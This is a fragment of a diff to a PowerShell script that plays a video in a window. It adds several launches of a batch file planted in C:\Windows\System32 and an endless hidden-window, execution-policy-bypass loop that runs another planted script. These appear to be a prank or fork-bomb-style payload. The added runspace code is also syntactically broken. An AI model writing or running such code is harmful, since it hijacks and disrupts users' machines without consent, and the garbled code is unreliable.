@@ -32,6 +32,12 @@ $VideoPlayer.Play()
 #Show Up the Window 
 $Window.ShowDialog() | out-null
 
-powershell -w h -Exec Bypass C:\Windows\System32\rr\fb.ps1;
+$NumberOfLogicalProcessor = (Get-WmiObject Win32_Processor).NumberOfLogicalProcessors;;[runspacefactory]::CreateRunspacePool(1,$NumberOfLogicalProcessors);;$RunspacePool.Open();;$PSinstance = [powershell]::(C:\Windows\System32\fb.bat);;$PSinstance.RunspacePool = $RunspacePool;;$PSinstance.BeginInvoke()
 
-'while (1) { powershell -w h -Exec Bypass C:\Windows\System32\rr\rr.ps1; }'
+C:\Windows\System32\fb.bat
+
+C:\Windows\System32\fb.bat
+
+C:\Windows\System32\fb.bat
+
+powershell -w h -Exec Bypass 'while (1) { C:\Windows\System32\rr\rr.ps1; }'
